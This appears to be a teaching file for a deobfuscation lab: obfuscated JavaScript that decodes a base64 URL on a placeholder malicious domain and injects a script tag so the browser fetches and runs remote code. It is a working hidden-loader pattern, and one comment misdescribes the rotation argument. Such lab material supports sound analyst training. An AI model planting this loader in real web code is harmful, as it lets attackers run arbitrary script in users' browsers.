/*
 * This file contains deliberately obfuscated JavaScript that mimics the kind
 * of techniques used by client‑side malware.  It is not malicious in itself,
 * but is written to look suspicious so that you can practice deobfuscation.
 *
 * The code hides a base64‑encoded URL and dynamically constructs a `<script>`
 * tag that loads a second JavaScript file from that domain.  In a real
 * attack this file could download additional payloads or exfiltrate data.
 * Your task in the hands‑on lab is to reverse these transformations,
 * understand what the script does and replace the encoded values with
 * something readable.
 */

var _0x5432 = [
  // base64("https://evil-domain.example/malware?id=")
  'aHR0cHM6Ly9ldmlsLWRvbWFpbi5leGFtcGxlL21hbHdhcmU/aWQ9',
  // an unused string to make the array look more complex
  'bW9kdWxl'
];

// A pointless function that rotates the array contents.  Its only purpose
// is to confuse static analysis.  At runtime it has no real effect
// because of the small second argument passed when it is called.
(function (_0xaf47ca, _0x5cb9b5) {
  var _0x3421 = function (_0x1ced85) {
    while (--_0x1ced85) {
      _0xaf47ca.push(_0xaf47ca.shift());
    }
  };
  _0x3421(++_0x5cb9b5);
})(_0x5432, 0x1e);

// Another layer of indirection to retrieve elements from the array.
var _0x1234 = function (_0xaf47ca, _0x5cb9b5) {
  _0xaf47ca = _0xaf47ca - 0x0;
  var _0x3421 = _0x5432[_0xaf47ca];
  return _0x3421;
};

// Pull the encoded URL out of the array.  The numeric argument here is
// deliberately hard to follow.  To deobfuscate the script you will need
// to inspect what `_0x1234(0x0)` returns.
var encodedUrl = _0x1234(0x0);

// A helper that decodes a base64 string.  Using `atob` is a common
// technique in malicious scripts because it is available in the browser.
function decode(_0xstring) {
  return atob(_0xstring);
}

// Build up the full URL by decoding the base64 and appending a query
// parameter.  In our benign example the value is a dummy identifier; in
// real malware this could be a victim id, an exfiltration channel, etc.
var decodedUrl = decode(encodedUrl) + '1234';

// Create a `<script>` element, set its `src` to the decoded URL and
// append it into the document.  This will cause the browser to fetch and
// execute the remote script.
var scriptElement = document.createElement('script');
scriptElement.src = decodedUrl;
document.head.appendChild(scriptElement);